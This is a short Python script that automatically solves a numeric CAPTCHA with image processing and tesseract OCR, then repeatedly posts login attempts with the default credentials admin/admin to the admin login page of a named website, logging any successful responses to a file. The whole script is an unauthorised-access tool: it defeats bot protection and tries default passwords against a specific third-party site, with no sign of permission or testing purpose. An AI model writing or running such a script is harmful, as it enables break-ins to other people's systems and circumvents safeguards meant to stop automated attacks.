import subprocess,json,base64,time
from PIL import Image
API='https://api.myxypt.com/captcha?width=140&height=48'
LOGIN='http://chinanaisi.com/admin/login.php'
for i in range(50):
    try:
        r=subprocess.run(['curl','-sk','--connect-timeout','6',API],capture_output=True,text=True,timeout=10)
        d=json.loads(r.stdout); uid=d['data']['uuid']; b64=d['data']['Captcha'].split(',')[1]
        open('/tmp/cc.jpg','wb').write(base64.b64decode(b64))
        im=Image.open('/tmp/cc.jpg').convert('L')
        im=im.resize((im.width*3,im.height*3),Image.LANCZOS)
        im=im.point(lambda x:0 if x<140 else 255); im.save('/tmp/ccp.png')
        subprocess.run(['tesseract','/tmp/ccp.png','/tmp/cco','-c','tessedit_char_whitelist=0123456789','--psm','7'],timeout=5)
        code=open('/tmp/cco.txt').read().strip().replace(' ','')[:5]
        r2=subprocess.run(['curl','-sk','--connect-timeout','6','-L',LOGIN,'-X','POST','-d',f'action=loginpost&uuid={uid}&loginId=&username=admin&password=admin&checkcode={code}'],capture_output=True,text=True,timeout=10)
        s='WRONG'
        if '后台登录' not in r2.stdout and '验证码' not in r2.stdout and len(r2.stdout)>50:
            s=f'HIT:{r2.stdout[:150]}'; open('/tmp/CC_HIT.txt','w').write(f'code={code} uid={uid}\n{r2.stdout[:500]}')
        print(f'{i}:OCR={code} {s[:70]}',flush=True)
    except Exception as e: print(f'{i}:ERR={e}',flush=True)
    time.sleep(0.3)
